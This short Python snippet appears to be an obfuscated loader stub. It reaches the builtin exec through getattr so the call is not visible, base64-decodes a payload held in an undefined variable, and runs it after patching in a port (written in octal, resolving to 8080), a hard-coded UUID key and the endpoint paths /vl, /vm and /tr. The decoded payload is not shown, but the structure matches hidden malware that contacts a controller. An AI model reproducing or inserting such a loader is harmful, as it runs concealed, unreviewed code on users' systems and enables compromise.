import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "90223ed9-2eab-42ba-b9c5-da619d2a21a4")
    .replace("__vl__", "/vl")
    .replace("__vm__", "/vm")
    .replace("__tr__", "/tr")
)